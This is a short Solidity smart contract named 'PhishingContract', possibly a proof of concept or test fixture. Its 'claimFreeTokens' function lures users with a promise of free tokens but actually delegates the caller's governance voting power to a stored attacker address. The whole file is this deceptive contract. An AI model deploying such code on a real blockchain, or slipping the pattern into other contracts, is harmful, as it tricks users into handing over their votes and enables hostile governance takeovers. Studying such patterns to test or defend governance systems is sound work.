// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGovernanceToken {
    function delegateVote(address to) external;
}

contract PhishingContract {
    IGovernanceToken public target;
    address public attacker;

    constructor(address _target, address _attacker) {
        target = IGovernanceToken(_target);
        attacker = _attacker;
    }

    function claimFreeTokens() external {
        target.delegateVote(attacker);
    }
}
